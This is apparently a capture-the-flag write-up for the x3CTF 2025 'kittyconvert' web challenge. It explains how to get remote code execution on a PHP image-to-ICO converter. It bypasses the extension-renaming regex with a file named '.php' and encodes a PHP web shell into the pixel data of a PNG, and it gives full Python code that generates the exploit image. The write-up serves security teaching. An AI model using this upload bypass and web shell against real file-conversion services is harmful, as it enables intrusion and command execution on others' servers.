---
title: kittyconvert
description: Need to convert a file? Our kittens have got you covered!
categories: ["ctf", "x3CTF 2025"]
tags: ["web"]
media_subpath: "/assets/posts/2025/x3ctf/kittyconvert"
---

We are given a PHP app that can convert images to `.ico` files:

```php
<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>PNG to ICO</title>
  <style type="text/css">
    html, body {
      background: #F9F9F9;
      margin: 0;
      font-family: system-ui, sans-serif;
      color: #444;
      text-align: center;
      min-height: 100vh;
    }
    h1 {
      margin: 0;
      display: block;
      width: calc(100% - 8px);
      background: linear-gradient(to right, #111, #222);
      color: #FFF;
      padding: 4px;
      user-select: none;
      cursor: pointer;
    }
    a {
      color: #b53836;
      text-decoration: none;
    }
    #header {
      background: linear-gradient(to right, #222, #444);
      color: #FFF;
      margin: 0;
    }
    #footer {
      width: 100%;
      color: #aaa;
      margin: 0;
    }
    #info {
      display: flex;
      align-items: center;
      text-align: left;
      padding: 32px;
      gap: 32px;
      max-width: 640px;
      margin: auto;
    }
    .format {
      border: 1px solid #5A5A5A;
      border-radius: 4px;
      padding: 8px 16px;
      user-select: none;
      cursor: pointer;
    }
    .btn {
      background: #B53836;
      color: #FFF;
      border-radius: 4px;
      display: inline-block;
      margin: 8px;
      padding: 16px 32px;
      font-size: 24px;
      user-select: none;
      cursor: pointer;
      transition: 0.1s filter;
      filter: brightness(1.0);
      &:hover {
        filter: brightness(1.1);
      }
      &:active {
        filter: brightness(0.9);
      }
    }
    #uploadBtn {
     background: #d30069;
    }
    input:invalid ~ #uploadBtn {
      display: none;
    }
    input:valid ~ #fileBtn {
      display: none;
    }
    #modal {
      display: flex;
      align-items: center;
      justify-content: center;
      position: fixed;
      top: 0;
      left: 0;
      background: #0007;
      width: 100%;
      height: 100%;
      &> div {
        width: 600px;
        height: fit-content;
        border-radius: 4px;
        background: #FFF;
        margin-bottom: 20%;
        transition: 0.75s opacity, 0.75s scale;
        opacity: 1;
        scale: 1;
        @starting-style {
          opacity: 0;
          scale: 0.75;
        }
      }
      opacity: 1;
      transition: 0.75s background, 0.75s opacity;
      @starting-style {
        background: #0000;
      }
      &:has(#close:checked) {
        opacity: 0;
        user-select: none;
        pointer-events: none;
      }
    }
    #icon {
      box-shadow: 1px 1px 13px 0 #d300df;
      width: 64px;
      height: 64px;
      transition: 2s opacity, 2s filter;
      opacity: 1;
      filter: blur(0px);
      @starting-style {
        opacity: 0;
        filter: blur(32px);
      }
    }
    #why {
      display: grid;
      grid-template-columns: 1fr 1fr;
      grid-template-rows: 1fr 1fr;
      text-align: left;
      padding: 32px;
      gap: 32px;
      max-width: 800px;
      margin: auto;
    }
  </style>
</head>
<body>
<div id="header">
  <h1>KittyConvert</h1>
  <div id="info">
    <div>
      <h2>PNG to ICO Converter</h2>
      <p>KittyConvert converts your image files online. Amongst no others, we support PNG. You can not use the options to control image resolution, quality and file size.</p>
    </div>
    <div>
      <p style="white-space: nowrap; font-size: 18px;">convert <span class="format">PNG</span> to <span class="format">ICO</span></p>
    </div>
  </div>
</div>
<?php
// Disable annoying warnings
error_reporting(E_ERROR | E_PARSE);
$success = false;

if (isset($_FILES['file'])) {
  $base_dir = "/var/www/html/";
  $ico_file = "uploads/" . preg_replace("/^(.+)\\..+$/", "$1.ico", basename($_FILES["file"]["name"]));

  if ($_FILES["file"]["size"] > 8000) {
    echo "<p>Sorry, your file is too large you need to buy Nitro.</p>";
  } else {
    require( dirname( __FILE__ ) . '/class-php-ico.php' );
    $ico_lib = new PHP_ICO( $_FILES["file"]["tmp_name"], array( array( 32, 32 ), array( 64, 64 ) ) );
    $ico_lib->save_ico( $base_dir . $ico_file );
    $success = true;
  }
}
?>
<form action="/" method="post" enctype="multipart/form-data">
  <input type="file" name="file" id="file" accept=".png" required style="display:none"><br>
  <label class="btn" for="file" id="fileBtn">Select File</label>
  <input type="submit" value="Convert" name="submit" class="btn" id="uploadBtn">
</form>
<h2>Why use KittyConvert?</h2>
<div id="why">
  <div>
    <h2>2 Formats Supported</h2>
    <p>Ngl KittyConvert is kinda mid for file conversions. We support no audio, video, document, ebook, archive, spreadsheet, and presentation formats. But the upside of that is that you don't need to download complicated and expensive software such as ImageMagick or Adobe Photoshop just to convert your files.</p>
  </div>
  <div>
    <h2>Business Model</h2>                                                                                                                                              <p>KittyConvert does not make money by selling your data, we tried it but we didn't make much money. So instead we have come up with an alternative business model to bring in funding. Read more about that in our <a href="https://en.wikipedia.org/wiki/Cat_caf%C3%A9">Business Model</a>.</p>
  </div>
  <div>
    <h2>Medium-Quality Conversions</h2>
    <p>Besides using open source software under the hood, we've tried to partner with various software vendors although nothing has come of it so far. Most conversion types can not be adjusted to your needs because it's easier to implement this way.</p>
  </div>
  <div>
    <h2>Powerful API</h2>
    <p>Our API allows custom integrations with your app. We don't like actually have an API but you can just see how the webapp works and curl the same endpoints so it's like having an API but epic.</p>
  </div>
</div>
<div id="footer">
© 2025 meow meow
<br><br>
</div>
<div id="modal" <?php if (!$success) echo 'style="display:none"'; ?>>
  <input type="checkbox" id="close" name="close" style="display:none">
  <div>
    <label for="close" style="font-size:16px; position:absolute; right: 8px; cursor: pointer;">x</label>
    <h2>You just made something awesome happen!</h2>
    <p>Here's your pawsome little ico file:</p>
    <?php if ($success) {
      echo '<a href="' . htmlspecialchars($ico_file) . '" download><img id="icon" src="' . htmlspecialchars($ico_file) . '" /></a>';
    } ?>
    <p>Click on it to download!</p>
  </div>
</div>
</body>
</html>
```
{: file="index.php" }

`class-php-ico.php` from [here](https://github.com/chrisbliss18/php-ico/blob/master/class-php-ico.php)

We are trying to achieve remote code execution by uploading a malicious `.php` file. 

The first thing we need to bypass is the conversion of the file extension to `.ico`:

`$ico_file = "uploads/" . preg_replace("/^(.+)\\..+$/", "$1.ico", basename($_FILES["file"]["name"]));`

This will rename any extension we provide to `.ico`. But notice that it has a strict regex that matches the
filename (without the extension) in a capture group, then the literal `.` character, then the extension.

But if the regex fails to match the input string, it will not apply the replacement. We need a filename that 
will fail the regex check. One example is leaving out the name before the extension. So, `.php` is a completely
valid filename that will be executed by the PHP engine that will not match the regex above and will not get renamed.

Now the next thing we need to take care of is the conversion itself to `.ico`, which will not preserve our input.
But let's take a look at how the conversion is made:

![](01.png)

Each pixel from the image (including the alpha channel) is taken from the image and written into the `.ico` file.
Since our final payload will be interpreted as PHP code (so, raw bytes / text file), we can encode our payload in the
pixel data in our image. `.ico` files can be based on either BMP or PNG. This PHP implementation uses the BMP base, 
so pixel data will be written without any compression. For example, if we have an RGBA pixel like `0x41424344`, in the
final `.ico` file each channel for each pixel will be written as raw bytes, so we will have hex values `41 42 43 44`
(not in this order), or `ABCD`. The PHP payload can be encoded this way into the pixels of the image.

![](02.png)

To decide upon the image size, we see that the server creates the `.ico` file using 32x32 and 64x64 dimensions (since
`.ico` files can support multiple resolutions). We can use the `Pillow` Python package to create the image, and use either 
size.

(full code will be provided at the end)

```py
payload = b"ABCDEFGHIJKLMNOPQRSTUVWXYZ"
colors = []

for chunk in chunks(payload, 4):
    chunk = chunk.ljust(4, b";")
    g, r, a, b = chunk
    final = bytes([a, r, g, b])
    final = int(final.hex(), 16)
    colors.append(final)
```

We split the payload in chunks of 4 (since there are 4 channels: red, green, blue and alpha). By trial and error I
saw that the format of each chunk is `0xGGRRAABB` in order to be written in the final file as `0xAARRGGBB` and still
reconstruct the original payload.

```py
image = Image.new("RGBA", (width, height))
pixels = image.load()

for y in range(height):
    for x in range(width):
        index = y * width + x
        color = colors[index] if index < len(colors) else 0
        r = (color >> 24) & 0xFF
        g = (color >> 16) & 0xFF
        b = (color >> 8) & 0xFF
        a = color & 0xFF
        pixels[x, height - y - 1] = (r, g, b, a)

image.save("exploit.png")
```

We use some bit shifts to retrieve the channels once again, and write them into the pixels. I used the `.png` format,
as `.bmp` seemed to lose the alpha channel in the PHP code. The `.png` format worked fine, and the library still created
the `.ico` file using BMP format.

In order to test the exploit, we need to call the PHP library. The library uses the GD library, which needs to be 
installed and activated. In Arch Linux the library can be installed using `sudo pacman -Syy php-gd` and activated by
uncommenting `extension=gd` in `/etc/php/php.ini`.

```php
<?php

require_once "src/class-php-ico.php";

$ico = new PHP_ICO("exploit.png", [[32, 32], [64, 64]]);
$ico->save_ico("final.ico");
```

Let's use `xxd` to inspect the `.ico` file:

![](03.png)

We successfully wrote the string into the `.ico` file. When uploading it as `.php`, it will be interpreted as PHP code,
which will display characters as-is until the first PHP directive.

Let's see what happens if we try to embed a payload like ```<?= `$_GET[0]` ?>```:

![](04.png)

Some characters get replaced, those in the position of the alpha channel. If we try to increase the alpha value by 1,
they will still be replaced with a higher value. Honestly, I have no idea why, probably some weird computations in the library.

We can work around this by placing spaces in the payload. For example, for this payload:
```python
payload = b"<?=`       $_GET[0]`?>"
```
the final file is fine:

![](05.png)

Now, we just need to upload the `.png` file with the literal name of `.php` and visit the file location. We can run commands
via the `?0=` query parameter.

Final Python code:

```py
def chunks(list_, n):
    for i in range(0, len(list_), n):
        yield list_[i:i + n]

payload = b"ABCDEFGHIJKLMNOPQRSTUVWXYZ"
payload = b"<?=`       $_GET[0]`?>"
colors = []

for chunk in chunks(payload, 4):
    chunk = chunk.ljust(4, b";")
    g, r, a, b = chunk
    final = bytes([a, r, g, b])
    print(final)
    final = int(final.hex(), 16)
    colors.append(final)

width = len(colors) // 2
height = width
width = 32
height = 32

image = Image.new("RGBA", (width, height))
pixels = image.load()

for y in range(height):
    for x in range(width):
        index = y * width + x
        color = colors[index] if index < len(colors) else 0
        r = (color >> 24) & 0xFF
        g = (color >> 16) & 0xFF
        b = (color >> 8) & 0xFF
        a = color & 0xFF
        pixels[x, height - y - 1] = (r, g, b, a)

image.save("exploit.png")
```
